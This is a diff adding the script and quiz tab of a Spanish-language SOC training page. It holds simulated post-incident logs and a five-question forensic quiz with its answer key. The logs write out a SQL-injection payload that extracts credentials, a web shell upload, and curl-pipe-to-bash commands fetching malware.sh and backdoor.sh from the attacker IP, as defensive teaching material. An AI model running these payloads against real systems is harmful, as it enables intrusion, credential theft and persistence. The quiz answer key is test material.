+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TAB 4: RETO FORENSE (QUIZ INTERACTIVO) -->
+    <section id="tab-quiz" class="tab-content flex-1 p-4 md:p-6 overflow-y-auto bg-soc-bg hidden">
+      <div class="max-w-4xl mx-auto space-y-6">
+        
+        <!-- Header -->
+        <div class="bg-soc-card border border-soc-border rounded-xl p-6 flex flex-col md:flex-row items-center justify-between gap-4">
+          <div>
+            <span class="bg-amber-500/20 text-amber-400 border border-amber-500/30 text-xs px-2.5 py-1 rounded-full font-mono font-semibold">DESAFÍO DFIR</span>
+            <h2 class="text-xl font-bold text-white mt-2">Caso Práctico: Análisis Forense de la Intrusión</h2>
+            <p class="text-xs text-slate-300 mt-1">
+              Analiza los eventos disponibles en el <strong>Visor de Logs</strong> y responde las 5 preguntas del analista SOC para completar el informe oficial del incidente.
+            </p>
+          </div>
+          <div class="bg-slate-950 border border-slate-800 p-4 rounded-xl text-center min-w-[140px]">
+            <div class="text-xs text-slate-400">Puntuación</div>
+            <div id="quiz-score" class="text-3xl font-bold text-amber-400 font-mono mt-1">0 / 500</div>
+            <div class="text-[10px] text-slate-500 mt-0.5">Puntos de Análisis</div>
+          </div>
+        </div>
+
+        <!-- Quiz Container -->
+        <div class="space-y-4" id="quiz-questions-container">
+          <!-- Dynamically Generated Questions -->
+        </div>
+
+        <!-- Quiz Summary Box (Hidden by Default) -->
+        <div id="quiz-summary" class="hidden bg-emerald-950/40 border border-emerald-800 rounded-xl p-6 text-center space-y-3">
+          <i class="fa-solid fa-trophy text-4xl text-amber-400"></i>
+          <h3 class="text-xl font-bold text-white">¡Investigación Forense Completada!</h3>
+          <p class="text-sm text-slate-300 max-w-xl mx-auto" id="quiz-summary-text">
+            Has identificado con éxito el vector de entrada del atacante, la IP maliciosa, el script de persistencia ejecutado y la hora exacta del compromiso.
+          </p>
+          <button onclick="resetQuiz()" class="bg-soc-accent hover:bg-blue-600 text-white font-medium px-4 py-2 rounded-lg text-xs transition">
+            Volver a Intento de Evaluación
+          </button>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <!-- JAVASCRIPT SOC ENGINE -->
+  <script>
+    // ==========================================
+    // 1. DATASET DE LOGS SIMULADOS (POST-INCIDENTE)
+    // ==========================================
+    const LOG_DATASET = [
+      {
+        id: 101,
+        timestamp: "2026-11-06T14:01:45.120Z",
+        service: "authlog",
+        serviceName: "Linux SSHd",
+        severity: "INFO",
+        isAnomaly: false,
+        sourceIp: "198.51.100.77",
+        port: 49152,
+        user: "root",
+        event: "Failed password for root from 198.51.100.77 port 49152 ssh2",
+        filePath: "/var/log/auth.log",
+        pid: 3120,
+        raw: "Nov  6 14:01:45 srv-prod-web-01 sshd[3120]: Failed password for root from 198.51.100.77 port 49152 ssh2",
+        explanation: "Intento de inicio de sesión SSH fallido para la cuenta root. Es el comienzo de la ráfaga de fuerza bruta."
+      },
+      {
+        id: 102,
+        timestamp: "2026-11-06T14:02:10.450Z",
+        service: "authlog",
+        serviceName: "Linux SSHd",
+        severity: "WARNING",
+        isAnomaly: true,
+        sourceIp: "198.51.100.77",
+        port: 49158,
+        user: "admin",
+        event: "Failed password for invalid user admin from 198.51.100.77 port 49158 ssh2",
+        filePath: "/var/log/auth.log",
+        pid: 3124,
+        raw: "Nov  6 14:02:10 srv-prod-web-01 sshd[3124]: Failed password for invalid user admin from 198.51.100.77 port 49158 ssh2",
+        explanation: "Ráfaga rápida de credenciales SSH probando usuarios inexistentes. Firma de escaneo automatizado (Hydra/Medusa)."
+      },
+      {
+        id: 103,
+        timestamp: "2026-11-06T14:03:15.010Z",
+        service: "nginx",
+        serviceName: "Nginx Access Log",
+        severity: "INFO",
+        isAnomaly: false,
+        sourceIp: "198.51.100.77",
+        httpStatus: 200,
+        httpMethod: "GET",
+        uri: "/index.php",
+        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        filePath: "/var/log/nginx/access.log",
+        raw: '198.51.100.77 - - [06/Nov/2026:14:03:15 +0000] "GET /index.php HTTP/1.1" 200 4520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
+        explanation: "Petición normal a la página de inicio. El atacante pivota a reconocer la aplicación web tras ser bloqueado en SSH."
+      },
+      {
+        id: 104,
+        timestamp: "2026-11-06T14:04:02.890Z",
+        service: "nginx",
+        serviceName: "Nginx Access Log",
+        severity: "WARNING",
+        isAnomaly: true,
+        sourceIp: "198.51.100.77",
+        httpStatus: 404,
+        httpMethod: "GET",
+        uri: "/admin/config.php.bak",
+        userAgent: "Gobuster/3.1.0",
+        filePath: "/var/log/nginx/access.log",
+        raw: '198.51.100.77 - - [06/Nov/2026:14:04:02 +0000] "GET /admin/config.php.bak HTTP/1.1" 404 162 "-" "Gobuster/3.1.0"',
+        explanation: "User-Agent directo 'Gobuster/3.1.0'. Indica un escaneo automatizado de directorios y archivos de respaldo expuestos."
+      },
+      {
+        id: 105,
+        timestamp: "2026-11-06T14:05:22.310Z",
+        service: "nginx",
+        serviceName: "Nginx Access Log",
+        severity: "CRITICAL",
+        isAnomaly: true,
+        sourceIp: "198.51.100.77",
+        httpStatus: 200,
+        httpMethod: "GET",
+        uri: "/api/products.php?id=1%20UNION%20SELECT%201,group_concat(username,0x3a,password),3%20FROM%20users--",
+        userAgent: "sqlmap/1.6.2#stable (https://sqlmap.org)",
+        filePath: "/var/log/nginx/access.log",
+        raw: '198.51.100.77 - - [06/Nov/2026:14:05:22 +0000] "GET /api/products.php?id=1%20UNION%20SELECT%201,group_concat(username,0x3a,password),3%20FROM%20users-- HTTP/1.1" 200 894 border "-" "sqlmap/1.6.2#stable"',
+        explanation: "Inyección SQL (SQLi) exitosa (Status 200) extrae la tabla de usuarios utilizando la herramienta automatizada sqlmap."
+      },
+      {
+        id: 106,
+        timestamp: "2026-11-06T14:05:55.700Z",
+        service: "nginx",
+        serviceName: "Nginx Access Log",
+        severity: "CRITICAL",
+        isAnomaly: true,
+        sourceIp: "198.51.100.77",
+        httpStatus: 200,
+        httpMethod: "POST",
+        uri: "/uploads/avatar_option.php",
+        userAgent: "Mozilla/5.0 (X11; Linux x86_64)",
+        filePath: "/var/log/nginx/access.log",
+        raw: '198.51.100.77 - - [06/Nov/2026:14:05:55 +0000] "POST /uploads/avatar_option.php HTTP/1.1" 200 312 "-" "Mozilla/5.0 (X11; Linux x86_64)"',
+        explanation: "Petición POST hacia un archivo PHP recién subido dentro de la carpeta pública /uploads/. Subida de Web Shell."
+      },
+      {
+        id: 107,
+        timestamp: "2026-11-06T14:06:15.102Z",
+        service: "auditd",
+        serviceName: "Linux Auditd",
+        severity: "CRITICAL",
+        isAnomaly: true,
+        sourceIp: "198.51.100.77",
+        user: "www-data (UID 33)",
+        pid: 8841,
+        ppid: 1420,
+        processName: "sh",
+        commandExec: "/bin/sh -c whoami; id; curl -s http://198.51.100.77/malware.sh | bash",
+        filePath: "/var/log/audit/audit.log",
+        raw: 'type=EXECVE msg=audit(1762437975.102:402): argc=3 a0="/bin/sh" a1="-c" a2="whoami; id; curl -s http://198.51.100.77/malware.sh | bash" pid=8841 ppid=1420 uid=33 auid=4294967295 euid=33',
+        explanation: "RCE EVIDENCIA PRINCIPAL: El proceso Nginx (PPID 1420) ejecutó un shell `/bin/sh` que descarga un script malicioso externo (`malware.sh`)."
+      },
+      {
+        id: 108,
+        timestamp: "2026-11-06T14:06:40.050Z",
+        service: "syslog",
+        serviceName: "Syslog Cron",
+        severity: "CRITICAL",
+        isAnomaly: true,
+        sourceIp: "Localhost",
+        user: "root (UID 0)",
+        commandExec: "crontab -e /tmp/persist_cron",
+        filePath: "/var/log/syslog",
+        pid: 8902,
+        raw: "Nov  6 14:06:40 srv-prod-web-01 CRON[8902]: (root) CMD (curl -s http://198.51.100.77/backdoor.sh | bash)",
+        explanation: "Persistencia establecida: Se añadió una tarea Cron ejecutándose como root cada minuto llamando al servidor del atacante."
+      }
+    ];
+
+    // ==========================================
+    // 2. RETOS / QUIZ QUESTIONS
+    // ==========================================
+    const QUIZ_QUESTIONS = [
+      {
+        id: 1,
+        question: "¿Cuál es la Dirección IP de origen identificada como la fuente del atacante?",
+        options: [
+          "192.168.1.45",
+          "198.51.100.77",
+          "10.0.4.12",
+          "127.0.0.1"
+        ],
+        correct: 1,
+        explanation: "La IP 198.51.100.77 aparece de manera consistente en la ráfaga SSH, las peticiones SQLi y la descarga del payload RCE."
+      },
+      {
+        id: 2,
+        question: "¿Qué técnica web utilizó el atacante para extraer datos confidenciales de la base de datos?",
+        options: [
+          "Cross-Site Scripting (XSS)",
+          "Path Traversal (../)",
+          "SQL Injection (UNION SELECT)",
+          "Buffer Overflow"
+        ],
+        correct: 2,
+        explanation: "En la petición a `/api/products.php?id=1%20UNION%20SELECT...` el atacante utilizó SQL Injection concatenando datos de la tabla de usuarios."
+      },
+      {
+        id: 3,
+        question: "¿Cuál es el nombre del script malicioso externo descargado y ejecutado en el servidor?",
+        options: [
+          "backdoor.php",
+          "malware.sh",
+          "avatar_option.php",
+          "config.php.bak"
+        ],
+        correct: 1,
+        explanation: "El registro de Auditd (14:06:15) muestra la ejecución del comando `curl -s http://198.51.100.77/malware.sh | bash`."
+      },
+      {
+        id: 4,
+        question: "¿Bajo qué cuenta de usuario del sistema operativo se ejecutó la primera Remote Code Execution (RCE)?",
+        options: [
+          "root (UID 0)",
+          "admin (UID 1000)",
+          "www-data (UID 33)",
+          "sshd (UID 110)"
+        ],
+        correct: 2,
+        explanation: "La Web Shell se ejecutó dentro del proceso del servidor web Nginx, adquiriendo los privilegios restringidos de `www-data` (UID 33)."
+      },
+      {
+        id: 5,
+        question: "¿En qué archivo de log específico se encuentra la prueba definitiva de la ejecución del comando `curl` a nivel de Kernel?",
+        options: [
+          "/var/log/nginx/access.log",
+          "/var/log/auth.log",
+          "/var/log/audit/audit.log",
+          "/var/log/dpkg.log"
+        ],
+        correct: 2,
+        explanation: "El servicio Auditd (`/var/log/audit/audit.log`) registra los eventos tipo EXECVE detallando los argumentos exactos de la llamada de sistema."
+      }
+    ];
+
+    // State Variables
+    let currentLogs = [...LOG_DATASET];
+    let selectedLogId = null;
+    let quizAnswers = {};
+    let currentScore = 0;
+
+    // Initialize UI
+    window.onload = function() {
+      renderLogs();
+      renderQuiz();
+      updateVisibleCount();
+    };
+
+    // ==========================================
+    // 3. LOG VISOR & RENDER LOGIC
+    // ==========================================
+    function renderLogs() {
+      const container = document.getElementById('logs-container');
+      container.innerHTML = '';
+
+      if (currentLogs.length === 0) {
+        container.innerHTML = `
+          <div class="text-center py-12 text-slate-500">
+            <i class="fa-solid fa-filter-circle-xmark text-3xl mb-2"></i>
+            <p>No se encontraron eventos con los filtros seleccionados.</p>
+          </div>
+        `;
+        return;
+      }
+
+      currentLogs.forEach(log => {
+        const item = document.createElement('div');
+        const isSelected = selectedLogId === log.id;
+        
+        let sevBg = "bg-slate-800/60 text-slate-400 border-slate-700";
+        if (log.severity === 'CRITICAL') sevBg = "bg-red-950/80 text-red-400 border-red-800/80 animate-pulse-fast";
+        if (log.severity === 'WARNING') sevBg = "bg-amber-950/80 text-amber-400 border-amber-800/80";
+
+        let serviceBadge = "bg-slate-900 text-slate-400";
+        if (log.service === 'nginx') serviceBadge = "bg-blue-950 text-blue-400 border border-blue-800/50";
+        if (log.service === 'authlog') serviceBadge = "bg-emerald-950 text-emerald-400 border border-emerald-800/50";
+        if (log.service === 'auditd') serviceBadge = "bg-purple-950 text-purple-400 border border-purple-800/50";
+        if (log.service === 'syslog') serviceBadge = "bg-amber-950 text-amber-400 border border-amber-800/50";
+
+        item.className = `p-2.5 rounded border transition-all cursor-pointer font-mono hover:bg-slate-900 ${
+          isSelected ? 'ring-2 ring-soc-accent bg-slate-900 border-soc-accent' : 'border-slate-800/80 bg-slate-950/80'
+        }`;
+        
+        item.onclick = () => showLogDetail(log.id);
+
+        item.innerHTML = `
+          <div class="flex flex-wrap items-center justify-between gap-2 mb-1.5">
+            <div class="flex items-center space-x-2">
+              <span class="text-[10px] px-1.5 py-0.5 rounded ${serviceBadge}">${log.serviceName}</span>
+              <span class="text-slate-400 text-[11px]">${log.timestamp}</span>
+              ${log.isAnomaly ? '<span class="bg-red-500/20 text-red-400 border border-red-500/40 text-[10px] px-1.5 py-0.2 rounded font-bold"><i class="fa-solid fa-triangle-exclamation mr-1"></i>ANOMALÍA</span>' : ''}
+            </div>
+            <span class="text-[10px] font-bold px-2 py-0.5 rounded border ${sevBg}">${log.severity}</span>
+          </div>
+          <div class="text-slate-200 text-xs truncate leading-relaxed">
+            ${escapeHtml(log.raw)}
+          </div>
+        `;
+
+        container.appendChild(item);
+      });
+
+      updateVisibleCount();
+    }
+
+    function filterLogs() {
+      const searchValue = document.getElementById('log-search').value.toLowerCase();
+      const serviceValue = document.getElementById('filter-service').value;
+      const severityValue = document.getElementById('filter-severity').value;
+      const anomaliesOnly = document.getElementById('filter-anomalies').checked;
+
+      currentLogs = LOG_DATASET.filter(log => {
+        // Search Filter
+        const matchesSearch = 
+          log.raw.toLowerCase().includes(searchValue) ||
+          (log.sourceIp && log.sourceIp.includes(searchValue)) ||
+          (log.commandExec && log.commandExec.toLowerCase().includes(searchValue));
+
+        // Service Filter
+        const matchesService = serviceValue === 'ALL' || log.service === serviceValue;
+
+        // Severity Filter
+        const matchesSeverity = severityValue === 'ALL' || log.severity === severityValue;
+
+        // Anomalies Filter
+        const matchesAnomaly = !anomaliesOnly || log.isAnomaly;
+
+        return matchesSearch && matchesService && matchesSeverity && matchesAnomaly;
+      });
+
+      renderLogs();
+    }
+
+    function highlightAttackPath() {
+      document.getElementById('filter-anomalies').checked = true;
+      document.getElementById('filter-severity').value = 'ALL';
+      document.getElementById('filter-service').value = 'ALL';
+      document.getElementById('log-search').value = '';
+      filterLogs();
+      showLogDetail(107); // Open main RCE event
+    }
+
+    function showLogDetail(logId) {
+      selectedLogId = logId;
+      renderLogs(); // Re-render to update selected ring styling
+
+      const log = LOG_DATASET.find(l => l.id === logId);
+      if (!log) return;
+
+      const panel = document.getElementById('detail-panel');
+      const content = document.getElementById('detail-content');
+      panel.classList.remove('hidden');
+
+      let fieldsHtml = `
+        <div class="bg-slate-950 border border-slate-800 p-3 rounded-lg space-y-2">
+          <div class="text-xs text-slate-400 font-semibold uppercase tracking-wider mb-1">Registro En bruto (Raw Event)</div>
+          <div class="font-mono text-xs text-emerald-400 break-all bg-black/40 p-2.5 rounded border border-slate-900">
+            ${escapeHtml(log.raw)}
+          </div>
+        </div>
+
+        <div class="bg-amber-950/30 border border-amber-800/50 p-3 rounded-lg space-y-1">
+          <div class="text-xs font-bold text-amber-400 flex items-center space-x-1">
+            <i class="fa-solid fa-lightbulb"></i>
+            <span>Interpretación Forense (DFIR Insight)</span>
+          </div>
+          <p class="text-xs text-slate-300 leading-relaxed">${log.explanation}</p>
+        </div>
+
+        <div class="space-y-2">
+          <div class="text-xs text-slate-400 font-semibold uppercase tracking-wider">Desglose Técnico de Campos</div>
+          
+          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
+            <div class="bg-slate-900 p-2 rounded border border-slate-800">
+              <span class="text-slate-500 block text-[10px]">Ruta de Log</span>
+              <span class="text-cyan-300 break-all">${log.filePath}</span>
+            </div>
+            <div class="bg-slate-900 p-2 rounded border border-slate-800">
+              <span class="text-slate-500 block text-[10px]">Timestamp ISO</span>
+              <span class="text-slate-200">${log.timestamp}</span>
+            </div>
+            ${log.sourceIp ? `
+            <div class="bg-slate-900 p-2 rounded border border-slate-800">
+              <span class="text-slate-500 block text-[10px]">IP Origen (Source)</span>
+              <span class="text-amber-400 font-bold">${log.sourceIp}</span>
+            </div>` : ''}
+            ${log.httpStatus ? `
+            <div class="bg-slate-900 p-2 rounded border border-slate-800">
+              <span class="text-slate-500 block text-[10px]">Código HTTP</span>
+              <span class="${log.httpStatus === 200 ? 'text-emerald-400' : 'text-red-400'} font-bold">${log.httpStatus}</span>
+            </div>` : ''}
+            ${log.user ? `
+            <div class="bg-slate-900 p-2 rounded border border-slate-800">
+              <span class="text-slate-500 block text-[10px]">Usuario Contexto</span>
+              <span class="text-pink-400">${log.user}</span>
+            </div>` : ''}
+            ${log.pid ? `
+            <div class="bg-slate-900 p-2 rounded border border-slate-800">
+              <span class="text-slate-500 block text-[10px]">Process ID (PID)</span>
+              <span class="text-purple-300">${log.pid} ${log.ppid ? `(PPID: ${log.ppid})` : ''}</span>
+            </div>` : ''}
+          </div>
+
+          ${log.commandExec ? `
+          <div class="bg-slate-900 p-2.5 rounded border border-slate-800 text-xs font-mono">
+            <span class="text-slate-500 block text-[10px] mb-1">Comando Ejecutado (Audit Exec string)</span>
+            <span class="text-red-400 break-all font-semibold">${escapeHtml(log.commandExec)}</span>
+          </div>` : ''}
+
+          ${log.userAgent ? `
+          <div class="bg-slate-900 p-2.5 rounded border border-slate-800 text-xs font-mono">
+            <span class="text-slate-500 block text-[10px] mb-1">User-Agent Header</span>
+            <span class="text-slate-300 break-all">${escapeHtml(log.userAgent)}</span>
+          </div>` : ''}
+        </div>
+      `;
+
+      content.innerHTML = fieldsHtml;
+    }
+
+    function closeDetailPanel() {
+      document.getElementById('detail-panel').classList.add('hidden');
+      selectedLogId = null;
+      renderLogs();
+    }
+
+    function updateVisibleCount() {
+      document.getElementById('log-count-visible').innerText = currentLogs.length;
+      document.getElementById('log-count-total').innerText = LOG_DATASET.length;
+    }
+
+    // ==========================================
+    // 4. RETO FORENSE (QUIZ LOGIC)
+    // ==========================================
+    function renderQuiz() {
+      const container = document.getElementById('quiz-questions-container');
+      container.innerHTML = '';
+
+      QUIZ_QUESTIONS.forEach((q, idx) => {
+        const card = document.createElement('div');
+        card.className = "bg-soc-card border border-soc-border rounded-xl p-5 space-y-4";
+        
+        let optionsHtml = '';
+        q.options.forEach((opt, optIdx) => {
+          const isSelected = quizAnswers[q.id] === optIdx;
+          const isSubmitted = quizAnswers[q.id] !== undefined;
+          let btnStyle = "bg-slate-900 text-slate-300 border-slate-800 hover:bg-slate-800";
+          
+          if (isSubmitted) {
+            if (optIdx === q.correct) {
+              btnStyle = "bg-emerald-950 text-emerald-300 border-emerald-700 font-semibold";
+            } else if (isSelected && optIdx !== q.correct) {
+              btnStyle = "bg-red-950 text-red-300 border-red-800";
+            }
+          }
+
+          optionsHtml += `
+            <button 
+              onclick="answerQuiz(${q.id}, ${optIdx})" 
+              ${isSubmitted ? 'disabled' : ''} 
+              class="w-full text-left p-3 rounded-lg border text-xs transition-all flex items-center justify-between ${btnStyle}">
+              <span>${opt}</span>
+              ${isSubmitted && optIdx === q.correct ? '<i class="fa-solid fa-circle-check text-emerald-400 text-sm"></i>' : ''}
+              ${isSubmitted && isSelected && optIdx !== q.correct ? '<i class="fa-solid fa-circle-xmark text-red-400 text-sm"></i>' : ''}
+            </button>
+          `;
+        });
+
+        card.innerHTML = `
+          <div class="flex items-start justify-between">
+            <h4 class="text-sm font-bold text-white flex items-center space-x-2">
+              <span class="bg-slate-800 text-soc-accent w-6 h-6 rounded-full flex items-center justify-center text-xs font-mono">${idx + 1}</span>
+              <span>${q.question}</span>
+            </h4>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+            ${optionsHtml}
+          </div>
+          ${quizAnswers[q.id] !== undefined ? `
+            <div class="mt-3 p-3 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-300">
+              <strong class="text-amber-400">Explicación DFIR:</strong> ${q.explanation}
+            </div>
+          ` : ''}
+        `;
+
+        container.appendChild(card);
+      });
+    }
+
+    function answerQuiz(questionId, optionIdx) {
+      quizAnswers[questionId] = optionIdx;
+      
+      const q = QUIZ_QUESTIONS.find(item => item.id === questionId);
+      if (q && q.correct === optionIdx) {
+        currentScore += 100;
+      }
+
+      document.getElementById('quiz-score').innerText = `${currentScore} / 500`;
+      
+      const answeredCount = Object.keys(quizAnswers).length;
+      document.getElementById('quiz-badge').innerText = `${answeredCount}/5`;
+
+      renderQuiz();
+
+      if (answeredCount === QUIZ_QUESTIONS.length) {
+        document.getElementById('quiz-summary').classList.remove('hidden');
+      }
+    }
+
+    function resetQuiz() {
+      quizAnswers = {};
+      currentScore = 0;
+      document.getElementById('quiz-score').innerText = `0 / 500`;
+      document.getElementById('quiz-badge').innerText = `0/5`;
+      document.getElementById('quiz-summary').classList.add('hidden');
+      renderQuiz();
+    }
+
+    // ==========================================
+    // 5. GENERAL NAVIGATION & HELPERS
+    // ==========================================
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+      document.getElementById(`tab-${tabId}`).classList.remove('hidden');
+
+      // Update Desktop Buttons
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.remove('bg-soc-accent', 'text-white', 'shadow-sm');
+        btn.classList.add('text-slate-400', 'hover:text-slate-200');
+      });
+      const activeBtn = document.getElementById(`tab-btn-${tabId}`);
+      if (activeBtn) {
+        activeBtn.classList.add('bg-soc-accent', 'text-white', 'shadow-sm');
+        activeBtn.classList.remove('text-slate-400');
+      }
+
+      // Update Mobile Buttons
+      document.querySelectorAll('.mob-tab-btn').forEach(btn => {
+        btn.classList.remove('bg-soc-accent', 'text-white');
+        btn.classList.add('text-slate-400');
+      });
+      const activeMobBtn = document.getElementById(`mob-tab-btn-${tabId}`);
+      if (activeMobBtn) {
+        activeMobBtn.classList.add('bg-soc-accent', 'text-white');
+      }
+    }
+
+    function filterPaths(category) {
+      document.querySelectorAll('.path-btn').forEach(btn => {
+        btn.classList.remove('bg-soc-accent', 'text-white');
+        btn.classList.add('bg-slate-800', 'text-slate-300');
+      });
+      event.target.classList.add('bg-soc-accent', 'text-white');
+
+      const cards = document.querySelectorAll('.path-card');
+      cards.forEach(card => {
+        if (category === 'all' || card.classList.contains(`path-${category}`)) {
+          card.classList.remove('hidden');
+        } else {
+          card.classList.add('hidden');
+        }
+      });
+    }
+
+    function resetLab() {
+      document.getElementById('log-search').value = '';
+      document.getElementById('filter-service').value = 'ALL';
+      document.getElementById('filter-severity').value = 'ALL';
+      document.getElementById('filter-anomalies').checked = false;
+      closeDetailPanel();
+      filterLogs();
+      resetQuiz();
+    }
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return str.replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+    }
+  </script>
+</body>
+</html>
